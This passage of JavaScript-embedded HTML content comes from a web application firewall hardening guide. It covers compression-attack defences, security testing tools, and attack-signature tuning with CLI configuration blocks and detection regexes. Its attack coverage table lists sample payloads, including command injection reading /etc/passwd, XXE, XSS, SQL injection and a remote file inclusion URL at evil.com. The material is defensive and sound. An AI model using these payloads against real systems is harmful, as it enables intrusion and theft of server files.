                    <li><strong>HPACK/QPACK Compression:</strong> Can be vulnerable to CRIME-like attacks if not properly validated</li>
                    <li><strong>Stream Prioritization:</strong> Can be abused for DoS attacks through priority inversion</li>
                    <li><strong>Reset Floods:</strong> HTTP/2 RST_STREAM frames can be used for DoS attacks</li>
                    <li><strong>QUIC Connection Migration:</strong> Can be abused for reflection attacks if not properly secured</li>
                    <li><strong>Header Compression State:</strong> State exhaustion attacks possible with malicious headers</li>
                    <li><strong>Request Multiplexing:</strong> Improper validation can lead to resource exhaustion</li>
                </ul>
            `
        },
        {
            title: 'Content Encoding Security',
            content: `
                <p class="mb-4 text-gray-700">Configure protection against compression-related vulnerabilities and attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure content encoding security</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">content-encoding</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Allowed encoding types</div>
                    <div><span class="code-param">allowed-encodings</span> <span class="code-value">gzip deflate br</span></div>
                    <div><span class="code-param">block-unknown-encodings</span> <span class="code-value">true</span></div>
                    <div class="code-comment"># Compression bomb protection</div>
                    <div><span class="code-param">max-compression-ratio</span> <span class="code-value">20</span></div>
                    <div><span class="code-param">max-decompressed-size</span> <span class="code-value">10485760</span></div>
                    <div><span class="code-param">decompression-timeout</span> <span class="code-value">5</span></div>
                    <div class="code-comment"># Protection against nested compression</div>
                    <div><span class="code-param">max-nested-compressions</span> <span class="code-value">1</span></div>
                    <div><span class="code-param">validate-compressed-content</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># BREACH/CRIME mitigation</div>
                    <div><span class="code-param">length-hiding-padding</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">disable-compression-on-https</span> <span class="code-value">for-sensitive-urls</span></div>
                    <div><span class="code-param">sensitive-url-patterns</span> <span class="code-value">"/login/* /account/* /admin/*"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Compression-Related Attacks</h5>
                <p class="mb-4 text-gray-700">Understanding and defending against compression-related vulnerabilities:</p>
                
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li><strong>Compression Bombs:</strong> Small compressed payloads that expand to consume enormous resources when decompressed</li>
                    <li><strong>BREACH/CRIME Attacks:</strong> Side-channel attacks exploiting HTTP compression to extract sensitive information</li>
                    <li><strong>Zip Slip:</strong> Directory traversal vulnerability using malicious archive files</li>
                    <li><strong>Nested Compression:</strong> Multiple layers of compression that can bypass size limits or hide malicious content</li>
                    <li><strong>CRIME-TLS:</strong> Variant of CRIME that targets TLS compression instead of HTTP</li>
                </ul>
                
                <p class="mb-4 text-gray-700">Defensive measures include:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li>Setting strict limits on compression ratios</li>
                    <li>Implementing timeouts for decompression operations</li>
                    <li>Limiting maximum decompressed size</li>
                    <li>Validating content after decompression</li>
                    <li>Disabling compression for sensitive operations</li>
                    <li>Adding random padding to responses to prevent size-based information leaks</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'HTTP Request Validator',
            icon: 'fa-exchange-alt',
            description: 'Tools for testing HTTP compliance and headers in requests and responses.',
            link: 'https://webhook.site/',
            linkText: 'Webhook.site'
        },
        {
            title: 'Security Headers Scanner',
            icon: 'fa-search',
            description: 'Analyze HTTP response headers for security best practices.',
            link: 'https://securityheaders.com/',
            linkText: 'SecurityHeaders.com'
        },
        {
            title: 'CSP Evaluator',
            icon: 'fa-shield-alt',
            description: 'Validate Content Security Policy effectiveness and find weaknesses.',
            link: 'https://csp-evaluator.withgoogle.com/',
            linkText: 'CSP Evaluator'
        },
        {
            title: 'HTTP Request Smuggler',
            icon: 'fa-bug',
            description: 'Test for HTTP request smuggling vulnerabilities.',
            link: 'https://portswigger.net/web-security/request-smuggling',
            linkText: 'PortSwigger Tool'
        },
        {
            title: 'h2spec',
            icon: 'fa-check-square',
            description: 'Conformance testing tool for HTTP/2 implementation validation.',
            link: 'https://github.com/summerwind/h2spec',
            linkText: 'GitHub'
        },
        {
            title: 'HTTP Observatory',
            icon: 'fa-eye',
            description: 'Mozilla\'s scanner for HTTP security configurations, headers, and best practices.',
            link: 'https://observatory.mozilla.org/',
            linkText: 'Mozilla Observatory'
        },
        {
            title: 'OWASP Secure Headers Project',
            icon: 'fa-list-alt',
            description: 'Guidance on implementing secure HTTP headers for web applications.',
            link: 'https://owasp.org/www-project-secure-headers/',
            linkText: 'OWASP Project'
        },
        {
            title: 'HTTP Toolkit',
            icon: 'fa-tools',
            description: 'Intercept, debug and build with HTTP(S) on Windows, Linux and Mac.',
            link: 'https://httptoolkit.tech/',
            linkText: 'HTTP Toolkit'
        },
        {
            title: 'QUIC Tracker',
            icon: 'fa-tachometer-alt',
            description: 'Toolset for analyzing HTTP/3 and QUIC protocol implementations.',
            link: 'https://quic-tracker.info.ucl.ac.be/',
            linkText: 'QUIC Tracker'
        },
        {
            title: 'HTTP/2 Tester',
            icon: 'fa-vial',
            description: 'Test website implementation of HTTP/2 and related features.',
            link: 'https://tools.keycdn.com/http2-test',
            linkText: 'KeyCDN Tool'
        },
        {
            title: 'Encoding Explorer',
            icon: 'fa-search-plus',
            description: 'Analyze and validate various encoding formats used in HTTP traffic.',
            link: 'https://dencode.com/',
            linkText: 'DenCode'
        },
        {
            title: 'HTTP Header Analyzer',
            icon: 'fa-microscope',
            description: 'Detailed analysis of HTTP request and response headers.',
            link: 'https://tools.geekflare.com/http-header-analyzer/',
            linkText: 'GeekFlare Tool'
        }
    ]
},
        {
    id: 'signatures',
    title: '5. Attack Signature Configuration',
    subtitle: 'Tuning pre-built attack signatures and managing false positives',
    icon: 'fa-shield-virus',
    priority: 'critical',
    progress: 44,
    checklist: [
        {
            title: '5.1 Signature Policy',
            icon: 'fa-file-signature',
            items: [
                { id: '5.1.1', text: 'Configure signature policy sensitivity level', priority: 'critical' },
                { id: '5.1.2', text: 'Set up automated signature updates', priority: 'high' },
                { id: '5.1.3', text: 'Create application-specific signature sets', priority: 'high' },
                { id: '5.1.4', text: 'Configure signature response actions (alert, block)', priority: 'critical' },
                { id: '5.1.5', text: 'Set up signature threat categories to enforce', priority: 'high' },
                { id: '5.1.6', text: 'Configure signature testing/staging environment', priority: 'medium' },
                { id: '5.1.7', text: 'Enable real-time signature deployment', priority: 'medium' },
                { id: '5.1.8', text: 'Implement graduated response severity levels', priority: 'high' },
                { id: '5.1.9', text: 'Configure signature correlation across events', priority: 'high' },
                { id: '5.1.10', text: 'Set up risk-based scoring for signature triggers', priority: 'medium' },
                { id: '5.1.11', text: 'Implement application-specific signature sensitivity', priority: 'high' },
                { id: '5.1.12', text: 'Configure attack chain detection thresholds', priority: 'high' },
                { id: '5.1.13', text: 'Set up notification workflows for critical signature triggers', priority: 'medium' },
                { id: '5.1.14', text: 'Implement A/B testing for new signature deployments', priority: 'medium' }
            ]
        },
        {
            title: '5.2 Signature Tuning',
            icon: 'fa-sliders-h',
            items: [
                { id: '5.2.1', text: 'Review and address signature false positives', priority: 'critical' },
                { id: '5.2.2', text: 'Configure URI-specific signature exceptions', priority: 'high' },
                { id: '5.2.3', text: 'Set up parameter-specific signature exceptions', priority: 'high' },
                { id: '5.2.4', text: 'Create source IP-based signature exceptions', priority: 'medium' },
                { id: '5.2.5', text: 'Implement signature thresholds for varied applications', priority: 'medium' },
                { id: '5.2.6', text: 'Document all signature exceptions with justification', priority: 'medium' },
                { id: '5.2.7', text: 'Configure cookie-specific signature validations', priority: 'high' },
                { id: '5.2.8', text: 'Set up header-specific signature validations', priority: 'high' },
                { id: '5.2.9', text: 'Implement time-bound exception windows', priority: 'medium' },
                { id: '5.2.10', text: 'Configure content-type specific exceptions', priority: 'high' },
                { id: '5.2.11', text: 'Set up method-specific signature exceptions', priority: 'high' },
                { id: '5.2.12', text: 'Implement user role-based signature exceptions', priority: 'medium' },
                { id: '5.2.13', text: 'Configure session-aware signature tuning', priority: 'high' },
                { id: '5.2.14', text: 'Set up exception approval workflow processes', priority: 'medium' }
            ]
        },
        {
            title: '5.3 Custom Signatures',
            icon: 'fa-fingerprint',
            items: [
                { id: '5.3.1', text: 'Create custom signatures for application-specific threats', priority: 'high' },
                { id: '5.3.2', text: 'Develop patterns for business logic attack detection', priority: 'high' },
                { id: '5.3.3', text: 'Configure regex-based attack pattern matching', priority: 'medium' },
                { id: '5.3.4', text: 'Test and validate custom signature effectiveness', priority: 'high' },
                { id: '5.3.5', text: 'Create signatures for known application vulnerabilities', priority: 'critical' },
                { id: '5.3.6', text: 'Document all custom signatures with purpose and logic', priority: 'medium' },
                { id: '5.3.7', text: 'Implement custom evasion detection signatures', priority: 'high' },
                { id: '5.3.8', text: 'Create correlating signatures for multi-stage attacks', priority: 'high' },
                { id: '5.3.9', text: 'Implement rate-based custom signatures', priority: 'high' },
                { id: '5.3.10', text: 'Develop context-aware signature patterns', priority: 'high' },
                { id: '5.3.11', text: 'Configure chained signature dependencies', priority: 'medium' },
                { id: '5.3.12', text: 'Create negative security model signatures', priority: 'high' },
                { id: '5.3.13', text: 'Implement byte-pattern analysis signatures', priority: 'medium' },
                { id: '5.3.14', text: 'Set up data exfiltration detection signatures', priority: 'high' }
            ]
        },
        {
            title: '5.4 Attack Type Coverage',
            icon: 'fa-bug',
            items: [
                { id: '5.4.1', text: 'Verify SQL Injection signature coverage', priority: 'critical' },
                { id: '5.4.2', text: 'Confirm Cross-Site Scripting (XSS) detection', priority: 'critical' },
                { id: '5.4.3', text: 'Validate command injection protection', priority: 'critical' },
                { id: '5.4.4', text: 'Ensure XXE (XML External Entity) attack detection', priority: 'high' },
                { id: '5.4.5', text: 'Check SSRF (Server-Side Request Forgery) protection', priority: 'high' },
                { id: '5.4.6', text: 'Verify Local File Inclusion (LFI) detection', priority: 'high' },
                { id: '5.4.7', text: 'Test Remote File Inclusion (RFI) signature coverage', priority: 'high' },
                { id: '5.4.8', text: 'Validate LDAP injection detection', priority: 'medium' },
                { id: '5.4.9', text: 'Test protection against template injection attacks', priority: 'high' },
                { id: '5.4.10', text: 'Verify deserialization attack protection', priority: 'high' },
                { id: '5.4.11', text: 'Implement GraphQL injection attack detection', priority: 'high' },
                { id: '5.4.12', text: 'Configure NoSQL injection protection', priority: 'high' },
                { id: '5.4.13', text: 'Set up WebSocket-specific attack detection', priority: 'medium' },
                { id: '5.4.14', text: 'Implement API-specific attack signatures', priority: 'high' },
                { id: '5.4.15', text: 'Configure JWT attack detection signatures', priority: 'high' },
                { id: '5.4.16', text: 'Verify SSRF (Server-Side Request Forgery) protection', priority: 'high' }
            ]
        },
        {
            title: '5.5 Signature Testing',
            icon: 'fa-vial',
            items: [
                { id: '5.5.1', text: 'Implement systematic signature effectiveness testing', priority: 'critical' },
                { id: '5.5.2', text: 'Configure performance impact monitoring for signatures', priority: 'high' },
                { id: '5.5.3', text: 'Set up automated testing with known attack vectors', priority: 'high' },
                { id: '5.5.4', text: 'Implement false positive validation testing', priority: 'critical' },
                { id: '5.5.5', text: 'Create signature bypass detection tests', priority: 'high' },
                { id: '5.5.6', text: 'Set up regression testing for tuned signatures', priority: 'high' },
                { id: '5.5.7', text: 'Configure dynamic signature testing in QA environments', priority: 'medium' },
                { id: '5.5.8', text: 'Implement signature coverage reporting', priority: 'medium' },
                { id: '5.5.9', text: 'Set up A/B comparison testing for signature updates', priority: 'medium' },
                { id: '5.5.10', text: 'Develop evasion technique testing framework', priority: 'high' }
            ]
        },
        {
            title: '5.6 Threat Intelligence Integration',
            icon: 'fa-brain',
            items: [
                { id: '5.6.1', text: 'Configure integration with threat intelligence feeds', priority: 'high' },
                { id: '5.6.2', text: 'Set up automated IOC-based signature generation', priority: 'high' },
                { id: '5.6.3', text: 'Implement IP reputation-based signature adjustments', priority: 'medium' },
                { id: '5.6.4', text: 'Configure industry-specific threat intel integration', priority: 'medium' },
                { id: '5.6.5', text: 'Set up targeted threat actor technique detection', priority: 'high' },
                { id: '5.6.6', text: 'Implement signature updates based on emerging threats', priority: 'critical' },
                { id: '5.6.7', text: 'Configure SIEM integration for correlation analysis', priority: 'high' },
                { id: '5.6.8', text: 'Set up behavior-based anomaly detection signatures', priority: 'high' },
                { id: '5.6.9', text: 'Implement CVE-based signature deployment', priority: 'critical' },
                { id: '5.6.10', text: 'Configure zero-day protection response plan', priority: 'high' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Signature Policy Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure signature policy with appropriate sensitivity and update settings.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure signature policy</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">attack-signatures</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                    <div><span class="code-param">update-automatically</span> <span class="code-value">yes</span></div>
                    <div><span class="code-param">update-frequency</span> <span class="code-value">daily</span></div>
                    <div><span class="code-param">update-time</span> <span class="code-value">03:00</span></div>
                    <div class="code-comment"># Enable specific attack categories</div>
                    <div><span class="code-command">category</span> <span class="code-value">"sql-injection"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"cross-site-scripting"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"command-injection"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"path-traversal"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"xml-attacks"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Signature Policy Configuration</h5>
                <p class="mb-4 text-gray-700">Configure graduated response levels and correlation for sophisticated attack detection:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure graduated response levels</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">attack-signatures</span></div>
                    <div><span class="code-command">response-policy</span></div>
                    <div class="code-comment"># Low severity response</div>
                    <div><span class="code-param">response-level</span> <span class="code-value">low</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">alert</span></div>
                    <div><span class="code-param">log</span> <span class="code-value">yes</span></div>
                    <div class="code-comment"># Medium severity response</div>
                    <div><span class="code-param">response-level</span> <span class="code-value">medium</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">challenge</span></div>
                    <div><span class="code-param">challenge-type</span> <span class="code-value">captcha</span></div>
                    <div><span class="code-param">log</span> <span class="code-value">yes</span></div>
                    <div class="code-comment"># High severity response</div>
                    <div><span class="code-param">response-level</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                    <div><span class="code-param">log</span> <span class="code-value">yes</span></div>
                    <div><span class="code-param">alert</span> <span class="code-value">yes</span></div>
                    <div class="code-comment"># Critical severity response</div>
                    <div><span class="code-param">response-level</span> <span class="code-value">critical</span></div>
                    <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                    <div><span class="code-param">ip-block-duration</span> <span class="code-value">1800</span></div>
                    <div><span class="code-param">log</span> <span class="code-value">yes</span></div>
                    <div><span class="code-param">alert</span> <span class="code-value">yes</span></div>
                    <div class="code-comment"># Configure attack correlation</div>
                    <div><span class="code-command">correlation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">window</span> <span class="code-value">300</span></div>
                    <div><span class="code-param">threshold</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">upgrade-severity</span> <span class="code-value">yes</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Signature Tuning and False Positive Management',
            content: `
                <p class="mb-4 text-gray-700">Configure exceptions to reduce false positives while maintaining security.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure signature exceptions</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">attack-signatures</span></div>
                    <div><span class="code-command">exception</span> <span class="code-value">add</span> <span class="code-param">signature-id</span> <span class="code-value">12345</span> <span class="code-param">url</span> <span class="code-value">"/api/code-examples"</span> <span class="code-param">parameter</span> <span class="code-value">"code"</span></div>
                    <div><span class="code-command">exception</span> <span class="code-value">add</span> <span class="code-param">category</span> <span class="code-value">"sql-injection"</span> <span class="code-param">url</span> <span class="code-value">"/admin/reports"</span> <span class="code-param">parameter</span> <span class="code-value">"query"</span></div>
                    <div class="code-comment"># Add exception documentation</div>
                    <div><span class="code-command">exception</span> <span class="code-value">12345</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"Code examples page legitimately contains code samples with SQL syntax"</span></div>
                    <div><span class="code-param">expiration</span> <span class="code-value">"2025-12-31"</span></div>
                    <div><span class="code-param">owner</span> <span class="code-value">"security-admin"</span></div>
                    <div><span class="code-param">ticket-id</span> <span class="code-value">"SEC-2025-0123"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Managing False Positives Systematically</h5>
                <p class="mb-4 text-gray-700">Effective WAF deployments require a process for reviewing and addressing false positives.</p>
                
                <ol class="list-decimal pl-6 mb-4 text-gray-700">
                    <li class="mb-2">Review WAF logs for blocked legitimate traffic</li>
                    <li class="mb-2">Identify signature ID causing the false positive</li>
                    <li class="mb-2">Analyze the context (URL, parameter, payload) triggering the signature</li>
                    <li class="mb-2">Create the most specific exception possible (avoid broad exceptions)</li>
                    <li class="mb-2">Document the exception with clear justification</li>
                    <li class="mb-2">Set an expiration date for reviewing the exception</li>
                    <li class="mb-2">Test the exception to confirm legitimate traffic passes</li>
                    <li>Monitor for potential security impact of the exception</li>
                </ol>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Signature Tuning Techniques</h5>
                <p class="mb-4 text-gray-700">Implement sophisticated tuning to minimize false positives while maintaining security:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure advanced signature tuning</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">attack-signatures</span></div>
                    <div class="code-comment"># Method-specific exceptions</div>
                    <div><span class="code-command">exception</span> <span class="code-value">add</span> <span class="code-param">signature-id</span> <span class="code-value">12346</span> <span class="code-param">url</span> <span class="code-value">"/api/data"</span> <span class="code-param">method</span> <span class="code-value">"POST"</span></div>
                    <div class="code-comment"># Content-type specific exceptions</div>
                    <div><span class="code-command">exception</span> <span class="code-value">add</span> <span class="code-param">signature-id</span> <span class="code-value">12347</span> <span class="code-param">url</span> <span class="code-value">"/api/upload"</span> <span class="code-param">content-type</span> <span class="code-value">"application/json"</span></div>
                    <div class="code-comment"># User role-based exceptions</div>
                    <div><span class="code-command">exception</span> <span class="code-value">add</span> <span class="code-param">signature-id</span> <span class="code-value">12348</span> <span class="code-param">url</span> <span class="code-value">"/admin/console"</span> <span class="code-param">user-role</span> <span class="code-value">"administrator"</span></div>
                    <div class="code-comment"># Time-bound exception windows</div>
                    <div><span class="code-command">exception</span> <span class="code-value">add</span> <span class="code-param">signature-id</span> <span class="code-value">12349</span> <span class="code-param">url</span> <span class="code-value">"/maintenance"</span> <span class="code-param">start-time</span> <span class="code-value">"2025-06-01T01:00:00"</span> <span class="code-param">end-time</span> <span class="code-value">"2025-06-01T05:00:00"</span></div>
                    <div class="code-comment"># Session-aware exceptions</div>
                    <div><span class="code-command">exception</span> <span class="code-value">add</span> <span class="code-param">signature-id</span> <span class="code-value">12350</span> <span class="code-param">url</span> <span class="code-value">"/api/batch-update"</span> <span class="code-param">session-cookie</span> <span class="code-value">"admin_session"</span> <span class="code-param">session-cookie-value</span> <span class="code-value">"*"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Custom Signature Development',
            content: `
                <p class="mb-4 text-gray-700">Create custom attack signatures for application-specific vulnerabilities and threats.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Create custom attack signatures</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">attack-signatures</span></div>
                    <div><span class="code-command">custom-signature</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Custom-SQLi-Legacy-App"</span></div>
                    <div><span class="code-command">custom-signature</span> <span class="code-value">"Custom-SQLi-Legacy-App"</span></div>
                    <div><span class="code-param">pattern</span> <span class="code-value">"\\b(exec|execute|exec sp_|sp_executesql|xp_cmdshell)\\b"</span></div>
                    <div><span class="code-param">category</span> <span class="code-value">"sql-injection"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"Custom signature to detect stored procedure execution attempts in legacy application"</span></div>
                    <div><span class="code-param">risk</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">accuracy</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">exit</span></div>
                    
                    <div class="code-comment"># Create evasion detection signature</div>
                    <div><span class="code-command">custom-signature</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Obfuscated-JS-Detection"</span></div>
                    <div><span class="code-command">custom-signature</span> <span class="code-value">"Obfuscated-JS-Detection"</span></div>
                    <div><span class="code-param">pattern</span> <span class="code-value">"(?:\\\\x[0-9a-f]{2}|\\\\u[0-9a-f]{4}){10,}"</span></div>
                    <div><span class="code-param">category</span> <span class="code-value">"cross-site-scripting"</span></div>
                    <div><span class="code-param">description</span> <span class="code-value">"Detects heavily encoded JavaScript potentially attempting to evade filters"</span></div>
                    <div><span class="code-param">risk</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">accuracy</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Custom Signature Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2">Use specific patterns to minimize false positives</li>
                    <li class="mb-2">Include context awareness (where the pattern appears)</li>
                    <li class="mb-2">Test signatures thoroughly with both attack and legitimate traffic</li>
                    <li class="mb-2">Document intent, logic, and any limitations of the signature</li>
                    <li class="mb-2">Consider the performance impact of complex regex patterns</li>
                    <li>Implement a review cycle to validate and improve custom signatures</li>
                </ul>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Advanced Custom Signature Techniques</h5>
                <p class="mb-4 text-gray-700">Implement sophisticated custom signatures for complex attack detection:</p>
                
                <div class="code-block">
                    <div class="code-comment"># Create context-aware custom signatures</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">attack-signatures</span></div>
                    <div class="code-comment"># Rate-based signature for brute force protection</div>
                    <div><span class="code-command">custom-signature</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"API-Rate-Limit-Violation"</span> <span class="code-param">type</span> <span class="code-value">"rate-based"</span></div>
                    <div><span class="code-command">custom-signature</span> <span class="code-value">"API-Rate-Limit-Violation"</span></div>
                    <div><span class="code-param">url-pattern</span> <span class="code-value">"/api/v1/.*"</span></div>
                    <div><span class="code-param">threshold</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">period</span> <span class="code-value">60</span></div>
                    <div><span class="code-param">track-by</span> <span class="code-value">ip-address</span></div>
                    <div><span class="code-param">risk</span> <span class="code-value">medium</span></div>
                    <div><span class="code-command">exit</span></div>
                    
                    <div class="code-comment"># Data exfiltration detection signature</div>
                    <div><span class="code-command">custom-signature</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Sensitive-Data-Exfiltration"</span></div>
                    <div><span class="code-command">custom-signature</span> <span class="code-value">"Sensitive-Data-Exfiltration"</span></div>
                    <div><span class="code-param">pattern</span> <span class="code-value">"(social|credit|ssn).{0,30}[0-9]{3}[-\\s]?[0-9]{2}[-\\s]?[0-9]{4}"</span></div>
                    <div><span class="code-param">location</span> <span class="code-value">response-body</span></div>
                    <div><span class="code-param">category</span> <span class="code-value">"data-leakage"</span></div>
                    <div><span class="code-param">risk</span> <span class="code-value">critical</span></div>
                    <div><span class="code-command">exit</span></div>
                    
                    <div class="code-comment"># Chained signature dependencies</div>
                    <div><span class="code-command">custom-signature</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"JWT-Token-Tampering"</span></div>
                    <div><span class="code-command">custom-signature</span> <span class="code-value">"JWT-Token-Tampering"</span></div>
                    <div><span class="code-param">pattern</span> <span class="code-value">"eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*"</span></div>
                    <div><span class="code-param">dependency</span> <span class="code-value">add</span> <span class="code-param">signature-id</span> <span class="code-value">12355</span> <span class="code-param">sequence</span> <span class="code-value">before</span> <span class="code-param">window</span> <span class="code-value">60</span></div>
                    <div><span class="code-param">category</span> <span class="code-value">"authentication-attacks"</span></div>
                    <div><span class="code-param">risk</span> <span class="code-value">high</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
            `
        },
        {
            title: 'Attack Type Coverage Matrix',
            content: `
                <p class="mb-4 text-gray-700">Comprehensive protection against common web application attacks requires signature coverage for multiple attack vectors.</p>
                
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Attack Type</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Sample Attack Pattern</th>
                            <th class="p-3 border bg-gray-100">Signature Configuration</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">SQL Injection</td>
                            <td class="p-3 border">Inserting malicious SQL code to manipulate databases</td>
                            <td class="p-3 border"><code>' OR 1=1 --</code></td>
                            <td class="p-3 border">Enable SQL injection signatures with high sensitivity</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Cross-Site Scripting (XSS)</td>
                            <td class="p-3 border">Injecting client-side scripts into web pages</td>
                            <td class="p-3 border"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
                            <td class="p-3 border">Enable XSS signatures with character set validations</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Command Injection</td>
                            <td class="p-3 border">Executing OS commands on the server</td>
                            <td class="p-3 border"><code>; cat /etc/passwd</code></td>
                            <td class="p-3 border">Enable command injection signatures with special character detection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">XML External Entity (XXE)</td>
                            <td class="p-3 border">Exploiting XML parsers to access server files</td>
                            <td class="p-3 border"><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></td>
                            <td class="p-3 border">Enable XML attack signatures and DTD validation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Server-Side Request Forgery (SSRF)</td>
                            <td class="p-3 border">Forcing server to make unintended requests</td>
                            <td class="p-3 border"><code>http://internal-server/admin</code></td>
                            <td class="p-3 border">Enable URL validation and internal resource access signatures</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Local File Inclusion (LFI)</td>
                            <td class="p-3 border">Including local files in application</td>
                            <td class="p-3 border"><code>../../../etc/passwd</code></td>
                            <td class="p-3 border">Enable path traversal signatures with normalization</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Remote File Inclusion (RFI)</td>
                            <td class="p-3 border">Including remote malicious files</td>
                            <td class="p-3 border"><code>http://evil.com/shell.php</code></td>
                            <td class="p-3 border">Enable RFI signatures with URL validations</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Deserialization Attacks</td>
                            <td class="p-3 border">Exploiting serialized objects</td>
                            <td class="p-3 border"><code>O:8:"Example":1:{...}</code></td>
                            <td class="p-3 border">Enable custom deserialization attack signatures</td>
                        </tr>
                    </tbody>
                </table>
                
                <div class="code-block">
                    <div class="code-comment"># Enable comprehensive attack coverage</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">appwall</span></div>
                    <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                    <div><span class="code-command">attack-signatures</span></div>
                    <div><span class="code-command">category</span> <span class="code-value">"sql-injection"</span> <span class="code-param">state</span> <span class="code-value">enable</span> <span class="code-param">sensitivity</span> <span class="code-value">high</span></div>
